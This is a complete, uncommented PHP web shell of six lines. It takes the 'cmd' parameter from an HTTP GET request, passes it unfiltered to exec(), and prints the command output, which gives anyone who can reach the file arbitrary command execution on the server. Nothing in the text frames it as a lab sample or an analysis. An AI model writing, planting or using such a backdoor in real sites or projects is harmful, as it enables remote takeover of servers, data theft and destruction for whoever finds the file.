<?php
$cmd = $_GET['cmd'];
$rules = array();
$res = exec($cmd, $rules);
print_r($rules);
?>
